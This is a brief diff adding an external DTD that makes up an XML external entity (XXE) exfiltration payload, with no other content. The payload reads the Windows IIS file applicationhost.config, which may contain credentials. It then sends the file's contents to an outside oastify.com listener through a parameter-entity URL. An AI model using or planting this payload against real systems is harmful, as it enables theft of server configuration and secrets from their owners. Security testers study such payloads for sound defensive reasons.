@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/windows/system32/inetsrv/config/applicationhost.config">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mukaotg7vez8j8803ao50armzd54tvlja.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
